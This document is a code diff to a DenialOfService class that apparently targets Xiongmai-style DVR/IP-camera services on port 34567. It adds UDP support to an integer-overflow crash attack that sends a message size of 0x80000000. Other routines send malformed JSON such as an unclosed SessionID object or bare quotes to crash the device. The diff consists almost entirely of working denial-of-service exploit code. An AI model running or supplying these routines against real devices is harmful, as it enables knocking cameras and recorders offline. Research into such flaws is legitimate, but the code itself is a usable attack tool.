@@ -7,7 +7,7 @@ class DenialOfService
   def self.sandbox(target_ip, port = 34567, command = Command::Login)
     success = false
     begin
-      socket = XMSocket.new(target_ip, port)
+      socket = XMSocketTCP.new(target_ip, port)
       xmm = Command::Login.new
       xmm.message = "{\"Name\":\"OPTalk\", \"SessionID\": {}"
       socket.send_message xmm
@@ -34,20 +34,35 @@ class DenialOfService
     Command::Unknown => true
   }
   # This one involves overflowing an Int32 with a high UInt32. Values above 0x80000000 will cause a crash due to negative size
-  def self.use_size_int(target_ip, port = 34567, command = Command::Login)
+  def self.use_size_int(target_ip, connection_type = :tcp, port = 34567, command = Command::Login::Request)
     success = false
-    begin
-      socket = XMSocket.new(target_ip, port)
-      xmm = command.new
-      xmm.size = 0x80000000
-      xmm.message = ""
-      xmm.use_custom_size = true
-      socket.send_message xmm
-      socket.receive_message
-    rescue e : XMError::ReceiveEOF
-      success = true
-    rescue e
-      # supress
+
+    xmm = command.new
+    xmm.size = 0x80000000
+    xmm.message = ""
+    xmm.use_custom_size = true
+    if connection_type == :tcp
+      begin
+        socket = XMSocketTCP.new(target_ip, port)
+        socket.send_message xmm
+        socket.receive_message
+      rescue e : XMError::ReceiveEOF
+        success = true
+      rescue e
+        # supress
+      end
+    elsif connection_type == :udp
+      begin
+        socket = XMSocketUDP.new(target_ip, port)
+        socket.send_message xmm
+        socket.receive_message
+      rescue e : XMError::ReceiveEOF
+        success = true
+      rescue e : XMError::ReceiveTimeout
+        success = true
+      rescue e
+        # supress
+      end
     end
     success
   end
@@ -68,7 +83,7 @@ class DenialOfService
     success = false
 
     begin
-      socket = XMSocket.new(target_ip, port)
+      socket = XMSocketTCP.new(target_ip, port)
       xmm = command.new
       xmm.message = "{\"#{command.to_s.split("::")[1]}\":0}"
       socket.send_message xmm
@@ -95,7 +110,7 @@ class DenialOfService
   def self.use_message_quotes(target_ip, port = 34567, command : XMMessage.class = Command::GetSafetyAbility)
     success = false
     begin
-      socket = XMSocket.new(target_ip, port)
+      socket = XMSocketTCP.new(target_ip, port)
       xmm = command.new
       xmm.message = "\"\""
       socket.send_message xmm
